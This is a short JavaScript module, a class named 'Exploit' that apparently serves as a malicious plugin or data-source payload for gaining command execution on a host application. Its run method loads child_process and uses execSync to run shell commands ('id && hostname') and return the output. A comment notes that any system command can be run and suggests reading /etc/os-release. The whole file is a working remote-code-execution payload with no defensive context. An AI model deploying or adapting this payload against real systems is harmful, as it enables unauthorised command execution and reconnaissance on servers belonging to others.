class Exploit {
  async run(sourceOptions, queryOptions) {
    // Require Node.js modules and execute system commands
    const { execSync } = require('child_process');
    // Run any system command. Example: 'id && hostname && cat /etc/os-release'
    const output = execSync('id && hostname').toString();
    return { status: 'ok', data: { result: output } };
  }
}
module.exports = { default: Exploit };
